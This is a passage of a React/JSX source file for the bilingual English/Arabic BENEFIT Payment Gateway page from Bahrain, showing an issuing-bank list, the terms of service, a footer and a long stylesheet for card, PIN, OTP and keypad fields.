                    <span className="text_EN" style={{ display: 'inline' }}>
                      Payment international Enterprise BSC (closed)
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بيمنت انترناشونال انتربريز
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Standard Chartered Bank
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      ستاندرد شارترد
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      STATE BANK OF INDIA (FOREIGN BRANCH)
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الهند الوطني
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      The Housing Bank For Trade And Finance - Jordan
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الإسكان و التجارة و التمويل
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      United Bank Limited
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      البنك المتحد المحدود
                    </span>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div id="footerDiv">
          <div className="parent_div">
            <div style={{ textAlign: 'justify' }} className="container">
              <div id="bank_lista" className="a_with_items">
                <span className="text_EN" style={{ display: 'inline' }}>
                  <b>Note:</b> By submitting your information and using "BENEFIT
                  Payment Gateway", you indicate that you agree to the{' '}
                  <a
                    className="a_with_items a_items_container"
                    style={{ color: 'red' }}
                  >
                    Terms of Services - Legal Disclaimer
                  </a>
                  .
                </span>
                <span className="text_AR" style={{ display: 'none' }}>
                  <b>ملاحظة</b>: إن تقديم هذه المعلومات واستخدام "بوابة الدفع
                  الإلكترونية من بنفت" يعني موافقتك على{' '}
                  <a className="a_with_items a_items_container">
                    شروط هذه الخدمة – إبراء الذمة القانوني
                  </a>
                  .
                </span>
              </div>
              <ul className="a_items_container" style={{ display: 'none' }}>
                <li style={{ listStyleType: 'none' }}>
                  <div>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      <b>Terms of Service </b>
                      <br />
                      By accessing this site and any pages thereafter , you
                      agree to and accept the terms and conditions below. Please
                      do not access this site or any pages thereafter if you do
                      not accept the terms below:
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      <b>شروط الخدمة</b>
                      <br />
                      من خلال دخول هذا الموقع وأي من صفحاته، فإنك توافق وتقبل
                      الشروط والأحكام أدناه. يرجى عدم دخول هذا الموقع أو أي من
                      الصفحات التالية إذا لم توافق على الشروط أدناه :
                    </span>
                  </div>
                  <br />
                  <div>
                    <b>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Definitions:{' '}
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        التعريفات:{' '}
                      </span>
                    </b>
                    <br />
                    <span className="text_EN" style={{ display: 'inline' }}>
                      “BENEFIT” means The BENEFIT Company
                      <br />
                      “Issuer” Means the customer’s card issuing bank.
                      <br />
                      “User” means the person using BENEFIT’s Payment Gateway.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      "بنفت" تعني شركة بنفت.
                      <br />
                      "الجهة الصادرة" تعني البنك المُصدر لبطاقة الزبون.
                      <br />
                      "المستخدم" تعني الشخص المستخدم لبوابة الدفع الإلكترونية من
                      بنفت.
                    </span>
                  </div>
                  <br />
                  <div>
                    <b>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Terms:{' '}
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        الشروط:
                      </span>
                    </b>
                    <ol style={{ listStyleType: 'decimal' }}>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          The User agrees and declares BENEFIT and the Issuer
                          that the User is using this BENEFIT Payment Gateway at
                          his/her own risk and responsibility. The user shall be
                          fully responsible and accountable for the
                          confidentiality of his/her PIN.{' '}
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          يوافق المستخدم ويقر لشركة بنفت والجهة الصادرة بأنه
                          يستخدم بوابة الدفع الإلكترونية من بنفت على
                          مسؤوليته/مسؤولياتها. وسيكون المستخدم مسؤولا بالكامل
                          وموضع مساءلة عن سرية رقم التعريف الشخصي الخاص به/بها.{' '}
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          The User further agrees that BENEFIT and the Issuer
                          are not responsible or accountable in any way to the
                          User for any loss or damage whatsoever that he/she
                          might incur as a result of using BENEFIT’s Payment
                          Gateway.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          يوافق المستخدم أيضاً على عدم تحمل كل من شركة بنفت
                          والجهة الصادرة أي مسؤولية بأي طريقة أمام المستخدم عن
                          أي خسارة أو ضرر أياً كان قد يتعرض له المستخدم نتيجة
                          لاستخدامه بوابة الدفع الإلكترونية من بنفت.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          The user shall be fully responsible and accountable
                          for the confidentiality of his/her PIN. No user under
                          any circumstances whatsoever and to whomsoever shall
                          divulge the secrecy of his/her PIN. Under no
                          circumstances shall a user establish connection to
                          BENEFIT’s Payment Gateway service using his/her
                          debit/credit card number and PIN and then let other
                          person(s) carry on with operating the system.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          سيكون المستخدم مسؤولا مسؤولية كاملة عن سرية رقم
                          التعريف الشخصي الخاص به/بها. ولا يجوز لأي مستخدم إفشاء
                          سرية رقم التعريف الشخصي الخاص به/بها. كما لا يجوز
                          للمستخدم تحت أي ظروف التواصل مع خدمة بوابة الدفع
                          الإلكترونية من شركة بنفت باستخدام بطاقته/ بطاقتها
                          الائتمانية/ الخصم ورقم التعريف الشخصي، ثم يترك لشخص
                          آخر (أشخاص آخرين) مواصلة تشغيل النظام.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          Not all products and services thereafter are available
                          in all geographic areas. Your eligibility for availing
                          any product or service is subject to BENEFIT’s and/or
                          the Issuer’s discretion and agreement.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          لا تتوفر جميع المنتجات والخدمات في كافة المناطق
                          الجغرافية. إن قدرتك على الحصول على أي منتج أو خدمة
                          يخضع لقرار وموافقة شركة بنفت و/أو الجهة الصادرة.{' '}
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          BENEFIT does not warrant the accuracy , adequacy or
                          completeness of the information and materials
                          contained in this site , BENEFIT further disclaims
                          liability for any errors or omissions in this
                          information and materials. No warranty of any kind ,
                          implied , express or statutory is given in conjunction
                          with the information or material here.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          لا تضمن شركة بنفت دقة أو كفاية أو شمولية المعلومات
                          والمواد المدرجة في هذا الموقع. وتبرئ شركة بنفت ذمتها
                          من أي أخطاء أو نقص في هذه المعلومات والمواد. كما لا
                          توجد أي ضمانات من أي نوع سواء ضمنية أو صريحة أو
                          قانونية تتعلق بالمعلومات أو المواد الواردة هنا.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          BENEFIT will not be liable for any damages or losses ,
                          including without limitation direct or indirect
                          special , incidental , or consequential losses or
                          damages or any expenses whatsoever arising in
                          connection with any use of this site or any inability
                          to use by any party , or in relation to any failure of
                          performance , error , omission , interruption , delay
                          , defect pertaining to operation or transmission ,
                          computer virus , or system failure howsoever caused.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          لن تكون بنفت مسؤولة عن أي أضرار أو خسارة أو أي مصروفات
                          أياً كانت، بما في ذلك على سبيل المثال لا الحصر الخسائر
                          أو الأضرار المباشرة أو غير المباشرة، أو العرضية، أو
                          الاستتباعية الناشئة عن استخدام هذا الموقع أو عدم
                          القدرة على استخدامه من قبل أي طرف، أو فيما يتعلق بسوء
                          الاداء، أو الأخطاء، أو النقص، أو التعطيل، أو التأخير،
                          أو العيوب المتعلقة بالتشغيل أو النقل، أو فيروسات
                          الحاسب الآلي، أو فشل النظام أياً كان السبب.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          Any information submitted to BENEFIT and/or the Issuer
                          through this site shall not be treated as confidential
                          information except in so far as agreed and accepted in
                          a bank customer relationship or as required by law or
                          regulations.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          لن يتم التعامل مع أي معلومات تم تقديمها إلى شركة بنفت
                          و/أو الجهة الصادرة من خلال هذا الموقع باعتبارها
                          معلومات سرية باستثناء ما تقضيه العلاقة المقبولة
                          والمتفق عليها القائمة بين الزبون والبنك أو وفق ما
                          يتطلبه القانون أو الأحكام التنظيمية.
                        </span>{' '}
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          This site is not directed to , or intended for
                          distribution to or use by , any person or entity who
                          is a citizen or resident of or located in any
                          jurisdiction wherever such distribution , publication
                          availability or use would be contrary to law or
                          regulation or which would subject BENEFIT to any
                          registration or licensing requirement within such
                          jurisdiction.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          هذا الموقع غير موجه ولا يستهدف توجيهه أو استخدامه من
                          قبل أي شخص أو كيان يكون مواطناً أو مقيماً أو يقع ضمن
                          أي سلطات قضائية مخالفة للقانون أو أي أحكام تنظيمية أو
                          قد تفرض على شركة بنفت الوفاء بمتطلبات التسجيل أو
                          الترخيص ضمن جهة هذه السلطة القضائية.
                        </span>{' '}
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          BENEFIT reserves the right to amend these Terms of
                          Service at any time and from time to time and you must
                          read these Terms of Service at regular intervals to
                          ensure that you are familiar with their content.{' '}
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          تحتفظ بنفت بالحق في تعديل شروط الخدمة في أي وقت ومن
                          وقت لآخر. ويجب عليك قراءة شروط الخدمة بشكل منتظم لضمان
                          الإطلاع على محتواها.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          BENEFIT owns all intellectual property on this site
                          and all rights are reserved.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          تملك بنفت كافة الحقوق الفكرية عن هذا الموقع وجميع
                          الحقوق محفوظة.
                        </span>
                      </li>
                      <li>
                        <span className="text_EN" style={{ display: 'inline' }}>
                          These Terms of Service are governed by and will be
                          construed in accordance with Bahrain Law. The User
                          hereby submits to the non-exclusive jurisdiction of
                          the courts of Bahrain.
                        </span>
                        <span className="text_AR" style={{ display: 'none' }}>
                          تخضع شروط الخدمة ويتم تفسيرها وفق قانون البحرين.
                          ويوافق المستخدم على الخضوع للسلطات القضائية غير
                          الحصرية لمحاكم البحرين.
                        </span>
                      </li>
                    </ol>
                  </div>
                </li>
              </ul>
              {/* </div> */}
              <br />
              {/* <div class="container" align="left"> */}
              <table>
                <tbody>
                  <tr>
                    <td>
                      <img src="/logo.webp" />
                    </td>
                  </tr>
                  <tr>
                    <td>
                      <span className="text_EN" style={{ display: 'inline' }}>
                        Powered By The BENEFIT Company.
                        <br />
                        Copyright © 2020-2025 The BENEFIT Company. All Rights
                        Reserved.
                        <br />
                        Licensed by Central Bank of Bahrain as Ancillary Service
                        Provider.
                      </span>
                      <span className="text_AR" style={{ display: 'none' }}>
                        يدار الموقع من قبل شركة بنفت.
                        <br />
                        حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
                        <br />
                        مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة
                        للقطاع المالي.
                      </span>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </form>
      <style>{`
      @charset "utf-8";
      /* CSS Document */
      body {
        font-family: 'Segoe UI', Tahoma;
        font-size: 14px;
        line-height: 18px;
        background-color: #f0f0f0;
      }
      :focus {
        outline: none;
        border-color: #999;
      }
      .cusel:focus {
        outline: none;
        border-color: #999;
      }
      
      .textpaddingleft {
        border-top-width: 0px;
        border-top-style: solid;
        padding-top: 8px;
      }
      input,
      select {
        padding: 5px;
        border: 1px solid #e3ddd7;
      }
      .formwidth {
        width: 45% !important;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      .formwidthforOtpResend {
        width: 50% !important;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      .keyformwidth {
        width: 100% !important;
        margin-left: 23%;
        margin-right: 23%;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      .keyformwidth-AR {
        width: 70% !important;
        margin-right: 26.5%;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      .col-lg-1,
      .col-lg-2,
      .col-lg-3,
      .col-lg-4,
      .col-lg-5,
      .col-lg-6,
      .col-lg-7,
      .col-lg-8,
      .col-lg-9,
      .col-lg-10,
      .col-lg-11,
      .col-lg-12 {
        float: left;
        display: inline-block;
      }
      .col-lg-12 {
        width: 100%;
      }
      .col-lg-11 {
        width: 91.66666667%;
      }
      .col-lg-10 {
        width: 83.33333333%;
      }
      .col-lg-9 {
        width: 75%;
      }
      .col-lg-8 {
        width: 66.66666667%;
      }
      .col-lg-7 {
        width: 58.33333333%;
      }
      .col-lg-6 {
        width: 50%;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      .col-lg-5 {
        width: 41.66666667%;
      }
      .col-lg-4 {
        width: 33.33333333%;
      }
      .col-lg-3 {
        width: 25%;
      }
      .col-lg-2 {
        width: 16.66666667%;
      }
      .col-lg-1 {
        width: 8.33333333%;
      }
      .wrapper {
        max-width: 960px;
        margin: 10px auto;
        border: 1px solid #d8d8d8;
      }
      .float-right {
        float: right;
        padding-top: 16px;
      }
      .body-container {
        background-color: #fff;
      }
      header {
        display: inline-block;
        width: 100%;
        background-color: #fff;
      }
      header img {
        padding: 5px;
      }
      .container {
        width: 98%;
        display: inline-block;
        padding: 1%;
      }
      .sub-title-line {
        font-size: 125%;
        font-weight: bold;
        margin-top: 10px;
        margin-bottom: 10px;
        padding-top: 10px;
        padding-bottom: 5px;
        border-bottom: 2px solid #f1f1f1;
      }
      .sub-title-line .col-lg-12 {
        height: 29px;
      }
      /* Accordion */
      .accordion h2,
      .accordion2 h2 {
        background: url(../images/paypage-images/heading-bg.jpg) 0 0 repeat-x;
        line-height: 29px;
        padding: 0 5px;
        font-weight: normal;
        font-size: 14px;
        color: #333;
        margin: 0;
        cursor: pointer;
      }
      .accordion2 h2.open {
        cursor: default;
      }
      .accordion2 h2.close {
        opacity: 1;
        width: 100%;
      }
      .accordion .group,
      .accordion2 .group {
        padding: 2px;
        margin-bottom: 3px;
      }
      .accordion .group .content,
      .accordion2 .group .content {
        padding: 5px;
      }
      .cvv-card {
        margin-top: 60px;
      }
      .captcha-field {
        float: left;
        margin: 5px 8px 5px 0;
      }
      .captcha {
        margin: 18px 5px 18px 0;
      }
      #reload:hover {
        cursor: pointer;
      }
      .btn {
        border: 0;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        border-radius: 5px;
        color: #fff;
        padding: 7px 15px;
        border: 0;
        -webkit-appearance: none;
      }
      .pbtn {
        width: 80px !important;
      }
      .btnwidth {
        width: 65px !important;
      }
      .gray-btn {
        background: #555;
        border: 0;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        border-radius: 5px;
        color: #fff;
        padding: 7px 15px;
        border: 0;
      }
      .gray-btn:hover {
        background: #333;
        cursor: pointer;
      }
      footer img {
        padding: 10px 5px 10px 0;
        vertical-align: middle;
      }
      .tooltip {
        display: none;
        position: absolute;
        border: 1px solid #333;
        background-color: #161616;
        border-radius: 5px;
        padding: 5px 10px;
        color: #fff;
        max-width: 300px;
      }
      .help {
        width: 24px;
        height: 34px;
        padding: 5px 12px;
        margin-left: 5px;
      }
      .note {
        color: #aeaeae;
        font-size: 75%;
        font-weight: normal;
      }
      input[type='radio'] {
        margin: 0;
      }
      .radio-txt {
        vertical-align: top;
        line-height: 13px;
        padding: 0 5px;
      }
      .progress-page {
        height: 100%;
        width: 100%;
        position: fixed;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 9999;
        top: 0;
        left: 0;
      }
      .progress-insidepage {
        text-align: left;
        left: 38%;
        top: 30%;
        position: absolute;
        background-color: #fff;
        padding: 10px;
      }
      .labelstyle {
        color: #fff;
        font-size: 20px;
        padding-left: 350px;
        padding-top: 550px;
      }
      .sucess {
        color: rgb(13, 167, 138);
        font-size: 16px;
      }
      .error {
        color: red;
        font-size: 16px;
      }
      .textstyle {
        font-size: 20px;
      }
      .labeltext {
        color: #0f0f0f;
        font-size: 16px;
      }
      .tickimg {
        display: block;
        margin-left: auto;
        margin-right: auto;
      }
      textarea {
        resize: none;
        border: 1px solid #e3ddd7;
      }
      
      @media (min-width: 980px) {
        .col-xs-1,
        .col-sm-1,
        .col-md-1,
        .col-lg-1,
        .col-xs-2,
        .col-sm-2,
        .col-md-2,
        .col-lg-2,
        .col-xs-3,
        .col-sm-3,
        .col-md-3,
        .col-lg-3,
        .col-xs-4,
        .col-sm-4,
        .col-md-4,
        .col-lg-4,
        .col-xs-5,
        .col-sm-5,
        .col-md-5,
        .col-lg-5,
        .col-xs-6,
        .col-sm-6,
        .col-md-6,
        .col-lg-6,
        .col-xs-7,
        .col-sm-7,
        .col-md-7,
        .col-lg-7,
        .col-xs-8,
        .col-sm-8,
        .col-md-8,
        .col-lg-8,
        .col-xs-9,
        .col-sm-9,
        .col-md-9,
        .col-lg-9,
        .col-xs-10,
        .col-sm-10,
        .col-md-10,
        .col-lg-10,
        .col-xs-11,
        .col-sm-11,
        .col-md-11,
        .col-lg-11,
        .col-xs-12,
        .col-sm-12,
        .col-md-12,
        .col-lg-12 {
          position: relative;
          min-height: 1px;
          /* padding-right: 15px;
        padding-left: 15px;*/
        }
      }
      @media (min-width: 980px) {
        .col-xs-1,
        .col-xs-2,
        .col-xs-3,
        .col-xs-4,
        .col-xs-5,
        .col-xs-6,
        .col-xs-7,
        .col-xs-8,
        .col-xs-9,
        .col-xs-10,
        .col-xs-11,
        .col-xs-12 {
          float: left;
          display: inline-block;
        }
        .col-xs-12 {
          width: 100%;
        }
        .col-xs-11 {
          width: 91.66666667%;
        }
        .col-xs-10 {
          width: 83.33333333%;
        }
        .col-xs-9 {
          width: 75%;
        }
        .col-xs-8 {
          width: 66.66666667%;
        }
        .col-xs-7 {
          width: 58.33333333%;
        }
        .col-xs-6 {
          width: 50%;
        }
        .col-xs-5 {
          width: 41.66666667%;
        }
        .col-xs-4 {
          width: 33.33333333%;
        }
        .col-xs-3 {
          width: 25%;
        }
        .col-xs-2 {
          width: 16.66666667%;
        }
        .col-xs-1 {
          width: 8.33333333%;
        }
      }
      .wordbreak {
        display: block;
        word-wrap: break-word;
        width: 150px;
      }
      .textcenter {
        margin-left: 32%;
        margin-right: auto;
      }
      .retrytextcenter {
        margin-right: auto;
      }
      .retrytextcenter span {
        font-size: 16px;
      }
      .overlay-container {
        display: block;
        width: 100%;
        height: 100%;
        /* position: fixed;*/
        top: 0;
        z-index: 10000;
        overflow: auto;
      }
      .black-overlay {
        display: block;
        position: fixed;
        top: 0%;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.2);
        z-index: 1000;
      }
      .overlay-container .popup {
        display: block;
        position: absolute;
        top: 50%;
        left: 50%;
        width: 82%;
        max-width: 450px;
        min-height: 268px;
        height: auto;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
        -ms-transform: translate(-50%, -50%);
        -moz-transform: translate(-50%, -50%);
        padding: 10px;
        /*  text-align: center; */
        z-index: 1000;
        background-color: #fff;
        /* border: 2px dashed #c5c5c5; */
        box-shadow: 0 0 0 7px #fff;
      }
      
      .overlay-container .popup .popupClose {
        font-size: 3.5em;
        cursor: pointer;
        position: absolute;
        right: 10px;
        top: 0px;
      }
      
      @media (min-width: 320px) and (max-width: 750px) {
        .keyformwidth {
          width: 300px !important;
          margin-left: 5px !important;
          margin-right: 3% !important;
        }
        .retrytextcenter {
          margin-right: auto;
        }
      
        div .textcenter .col-lg-4 {
          width: 33%;
        }
        .textcenter {
          margin-left: 10%;
        }
      }
      
      @media (min-width: 320px) and (max-width: 750px) {
        div #debitExpDate .col-lg-4 {
          width: 33%;
        }
      }
      
      @media (min-width: 320px) and (max-width: 750px) {
        div #creditExpDate .col-lg-4 {
          width: 33%;
        }
      }
      @media (min-width: 320px) and (max-width: 750px) {
        div #prepaidExpDate .col-lg-4 {
          width: 33%;
        }
      }
      
      @media (min-width: 375px) and (max-width: 750px) {
        .retrytextcenter {
          margin-right: auto;
        }
        .formwidth {
          width: 50% !important;
          padding-bottom: 5px;
          padding-top: 5px;
        }
        .formwidthforOtpResend {
          width: 55% !important;
          padding-bottom: 5px;
          padding-top: 5px;
        }
        .keyformwidth {
          width: 300px !important;
          margin-left: 5px !important;
          margin-right: 0% !important;
        }
      
        .keypad_container .col-lg-6 {
          width: 85%;
        }
        .keypad_container .keypadbtnalignment {
          margin-left: 10% !important;
          margin-right: 10% !important;
        }
        .keypad_container .btn {
          border: 0;
          -webkit-border-radius: 5px;
          -moz-border-radius: 5px;
          border-radius: 5px;
          color: #fff;
          padding: 7px 15px;
          border: 0;
          background: #d7181f;
          margin-right: 8px;
          margin-bottom: 8px;
          width: 45px;
          -webkit-appearance: none;
        }
        .btnwidth {
          width: 82px !important;
          margin-right: 8px !important;
          margin-left: 0px !important;
          margin-top: 5px;
        }
      
        #captcha_image {
          margin-top: 12px;
        }
      }
      
      .hgt-normal {
        line-height: normal;
      }
      
      .textcenter {
        margin-left: 32%;
        margin-right: auto;
      }
      
      @media screen and (max-width: 1280px) {
        .textcenter .col-lg-10 {
          width: 350px;
        }
        .textcenter .col-lg-5 {
          width: 175px;
        }
        .textcenter {
          margin-left: 30%;
        }
      }
      @media screen and (max-width: 600px) {
        .textcenter .col-lg-10 {
          width: 350px;
        }
        .textcenter .col-lg-5 {
          width: 175px;
        }
        .textcenter {
          margin-left: 20%;
        }
      }
      @media screen and (max-width: 414px) {
        .textcenter .col-lg-10 {
          width: 350px;
        }
        .textcenter .col-lg-5 {
          width: 145px;
        }
        .textcenter {
          margin-left: 10%;
        }
      }
      
      @media screen and (max-width: 350px) {
        .textcenter .col-lg-10 {
          width: 350px;
        }
        .textcenter .col-lg-5 {
          width: 350px;
        }
        .textcenter {
          margin-left: 28%;
        }
        .col-lg-6 {
          width: 80%;
        }
      }
      /* .bank-logo{margin-top:20px;} */
      .headingalignment {
        margin: 20px 5%;
      }
      
      .retrylogo {
        margin-left: 18px;
        margin-right: 6px;
        vertical-align: bottom;
        margin-top: 36px;
      }
      
      /* Benefit Payment Pages  */
      
      #bannerDiv table {
        margin-left: auto;
        margin-right: 0em;
        padding: 0.5em 0em;
      }
      
      body {
        direction: ltr;
      }
      
      body.EN {
        direction: ltr;
      }
      
      body.AR {
        direction: rtl;
      }
      
      .text_AR {
        font-family: Tahoma;
      }
      
      #contentDiv.AR {
        text-align: right;
      }
      
      #contentDiv.AR input[name='debitCardNumber'] {
        direction: ltr;
      }
      
      #contentDiv.AR input[name='debitCardholderName'] {
        direction: ltr;
      }
      
      #contentDiv.AR input {
        text-align: left;
      }
      
      #contentDiv.AR input[type='button'] {
        text-align: center;
        font-family: Tahoma;
      }
      #contentDiv.EN input[type='button'] {
        text-align: center;
      }
      
      #language_Button {
        cursor: pointer;
      }
      
      .aWithItems {
        cursor: pointer;
      }
      
      .AR .button {
        font-family: Tahoma;
      }
      
      #footerDiv a,
      #bank_list {
        text-decoration: underline;
      }
      
      #footerDiv,
      #viewContent {
        background-color: white;
      }
      
      #languageDiv a:hover,
      #footerDiv a:hover,
      #bank_list:hover {
        color: black;
      }
      
      #footerDiv.AR {
        text-align: right;
      }
      
      a:hover {
        color: #64c2f4;
        cursor: pointer;
      }
      
      .EN_field,
      .card_no_TextBox,
      .PIN_no_TextBox,
      .name_TextBox {
        direction: ltr !important;
        text-align: left !important;
      }
      
      #headerDiv {
        direction: ltr;
        padding: 0.5em;
      }
      
      #contentDiv .parent_div,
      #footerDiv .parent_div {
        padding: 0em;
      }
      
      #Ecom_Payment_Card_Number_ID td.paymentlabel {
        vertical-align: top;
      }
      #keypad_div_card_number {
        z-index: 1;
      }
      #keypad_div,
      #keypad_div_card_number {
        padding-top: 0.5em;
      }
      #keypad_div_top_text_TD,
      #keypad_div_top_text_card_number_TD {
        text-align: center;
        padding: 0em;
        cursor: default;
      }
      #keypad_div #numbers,
      #keypad_div_card_number #numbers_card_number {
        /* padding:.15em .5em; */
      }
      #keypad_div #numbers,
      #keypad_div_card_number {
      }
      #keypad_div #numbers td,
      #keypad_div_card_number #numbers_card_number td {
        text-align: center;
      }
      
      /* #keypad_div #numbers, #keypad_div_card_number #numbers_card_number
      {
          border:.1em solid silver;
          border-radius:.5em;
          background-color:#eeeeee;
      } */
      
      #headerDiv,
      #contentDiv {
        background-color: White;
      }
      
      .website_title_text,
      website_URL_text {
        display: initial !important;
      }
      
      #websiteTitleDiv {
        text-align: right;
        font-size: 2em;
        color: #0c4c6e;
        padding: 10px;
      }
      
      #mainDiv {
        width: 1000px;
      }
      
      #contentDiv .parent_div,
      #footerDiv .parent_div {
        padding: 0em;
      }
      
      #hostedBanner {
        display: initial !important;
      }
      
      #hostedBannerMbl {
        display: none !important;
      }
      
      #footerDiv table tr,
      #keypad_div #numbers table tr {
        background-color: transparent !important;
      }
      
      .otpPageformwidth {
        width: 75% !important;
        padding-bottom: 5px;
        padding-top: 5px;
      }
      
      /* mobile Version //////////////////////////////////////////////////////////*/
      @media screen and (max-width: 660px) and (orientation: landscape) {
        #mainDiv {
          width: 96%;
        }
      
        #hostedBannerMbl {
          display: initial !important;
        }
      
        #hostedBanner {
          display: none !important;
        }
      
        #banner_content_div {
          top: -1.25em;
          padding-right: 0em;
        }
        #banner_parent_div {
          text-align: center;
          margin: 0em auto;
          display: table;
        }
        #banner_img_div {
          display: block;
          border-left: 0em;
          padding-left: 0em;
          padding-bottom: 1em;
          float: inherit;
        }
        #websiteTitleDiv {
          position: relative;
          top: 0.3em;
          font-size: 1.4em;
          padding-bottom: 0.5em;
          text-align: center;
        }
      
        .tranformwidth {
          width: 70% !important;
          padding-bottom: 5px;
          padding-top: 5px;
        }
      }
      
      @media screen and (max-width: 660px) and (orientation: portrait) {
        #mainDiv {
          width: 94%;
        }
        #hostedBannerMbl {
          display: initial !important;
        }
      
        #hostedBanner {
          display: none !important;
        }
      
        #banner_content_div {
          padding-right: 0em;
        }
        #banner_parent_div {
          text-align: center;
          margin: 0em auto;
          display: table;
        }
        #banner_img_div {
          display: block;
          border-left: 0em;
          padding-left: 0em;
          padding-bottom: 1em;
          float: inherit;
        }
        #websiteTitleDiv {
          position: relative;
          top: 0.3em;
          font-size: 1.4em;
          padding-bottom: 0.5em;
          text-align: center;
        }
        #Ecom_Payment_Card_Verification_ID {
          display: none;
        }
        #Ecom_Payment_Card_Number_ID input.paymentinput,
        #Ecom_Payment_Card_Name_ID input.paymentinput,
        #Ecom_Payment_Pin_ID input.paymentinput {
          width: 11.37em;
        }
        #keypad_div,
        #keypad_div_card_number {
          position: relative;
          left: 0em;
          width: 100%;
          text-align: center;
          padding: 0em;
          padding-top: 0.5em;
        }
        #keypad_div #numbers,
        #keypad_div_card_number #numbers_card_number {
          width: 100%;
          padding: 0.5em 0em;
          border-left: 0em;
          border-right: 0em;
        }
        #keypad_div #numbers,
        #keypad_div #numbers table,
        #keypad_div_card_number #numbers_card_number,
        #keypad_div_card_number #numbers_card_number table {
          margin: 0em auto;
        }
        #keypad_div .button,
        #keypad_div_card_number .button {
          font-size: 1.15em;
        }
      
        .otpPageformwidth {
          width: 100% !important;
          padding-bottom: 5px;
          padding-top: 5px;
        }
      }
      /* tablet Version //////////////////////////////////////////////////////////*/
      @media screen and (min-width: 661px) and (max-width: 1260px) and (orientation: portrait) {
        #mainDiv {
          width: 96%;
        }
        #hostedBannerMbl {
          display: initial !important;
        }
      
        #hostedBanner {
          display: none !important;
        }
        #banner_content_div {
          top: -1.25em;
          padding-right: 0em;
        }
        #websiteTitleDiv {
          position: relative;
          top: 0.3em;
          font-size: 1.8em;
          padding-bottom: 1.25em;
        }
      
        .keypad_container .keypadbtnalignment {
          margin-left: 49% !important;
          margin-right: 49% !important;
        }
      }
      
      @media screen and (min-width: 768px) and (orientation: portrait) {
        .keypad_container .keypadbtnalignment {
          margin-left: 22% !important;
          margin-right: 22% !important;
        }
        .tranformwidth {
          width: 60% !important;
          padding-bottom: 5px;
          padding-top: 5px;
        }
      
        .otpPageformwidth label {
          width: 38% !important;
        }
        .disabled {
          pointer-events: none;
          background: gray !important;
          opacity: 0.7;
          cursor: no-drop !important;
        }
      
        #contentDiv.AR input[name='otpinput'] {
          direction: ltr;
        }
      
        #Retry {
          min-width: 186px;
        }
      
        /* The Modal (background) */
        .modal {
          display: none; /* Hidden by default */
          position: fixed; /* Stay in place */
          z-index: 1; /* Sit on top */
          left: 0;
          top: 0;
          width: 100%; /* Full width */
          height: 100%; /* Full height */
          overflow: auto; /* Enable scroll if needed */
          background-color: rgb(0, 0, 0); /* Fallback color */
          background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
        }
      
        /* Modal Content/Box */
        .modal-content {
          background-color: #fefefe;
          margin: 15% auto; /* 15% from the top and centered */
          padding: 20px;
          border: 1px solid #888;
          width: 30%; /* Could be more or less, depending on screen size */
        }
      
        /* ApplePay changes starts */
        .apple-pay-button {
          -webkit-appearance: -apple-pay-button;
          -apple-pay-button-type: plain;
          visibility: hidden; /* button is hidden by default */
          display: inline-block;
          width: 200px;
          min-height: 30px;
          border: 1px solid black;
          background-image: -webkit-named-image(apple-pay-logo-white);
          background-size: 100% calc(60% + 2px);
          background-repeat: no-repeat;
          background-color: black;
